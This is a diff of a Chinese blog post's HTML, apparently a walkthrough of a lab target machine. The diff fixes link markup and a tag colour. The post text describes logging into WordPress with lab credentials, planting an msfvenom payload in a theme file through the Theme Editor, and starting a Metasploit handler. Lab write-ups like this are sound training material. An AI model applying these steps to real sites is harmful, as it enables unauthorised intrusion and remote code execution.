@@ -201,7 +201,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #00bcd4">
+                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #00a596">
                     网安
                 </a>
             </span>
@@ -244,10 +244,10 @@
 <p>这个密码经测试，不是靶机中几个用户的密码。联想到靶机上运行着wordpress服务，猜测是wordpress上管理员账户的密码。</p>
 <p><img src="image-20250319172730587.png" alt="image-20250319172730587"></p>
 <p>只有一个用户，那就是他了。</p>
-<p>我们进入<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-login%EF%BC%8C%E7%94%A8victor%E4%BD%9C%E4%B8%BA%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E5%89%8D%E9%9D%A2%E8%8E%B7%E5%8F%96%E7%9A%84follow_the_ippsec%E4%B8%BA%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95%EF%BC%8C%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95%E3%80%82">http://192.168.23.156/wordpress/wp-login，用victor作为用户名，前面获取的follow_the_ippsec为密码进行登录，成功登录。</a></p>
+<p>我们进入<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-login">http://192.168.23.156/wordpress/wp-login</a> ，用victor作为用户名，前面获取的follow_the_ippsec为密码进行登录，成功登录。</p>
 <h3 id="渗透提权"><a href="#渗透提权" class="headerlink" title="渗透提权"></a>渗透提权</h3><p>在Appearance下Theme Editor下找到了secret.php这个可修改文件，我们用msfvenom做个马挂上去。</p>
 <p><img src="image-20250319173013451.png" alt="image-20250319173013451"></p>
-<p>secret.php的位置在哪里？前面dirb扫描目录的时候扫描到了“<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-content/themes/%E2%80%9D">http://192.168.23.156/wordpress/wp-content/themes/”</a> 这个目录，那就是在这里了。</p>
+<p>secret.php的位置在哪里？前面dirb扫描目录的时候扫描到了“<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-content/themes/">http://192.168.23.156/wordpress/wp-content/themes/</a> ” 这个目录，那就是在这里了。</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.23.156/wordpress/wp-content/themes/twentynineteen/secret.php</a></p>
 <p>kali上，msfconsole提前准备好。</p>
 <pre><code class="bash">use exploit/multi/handler
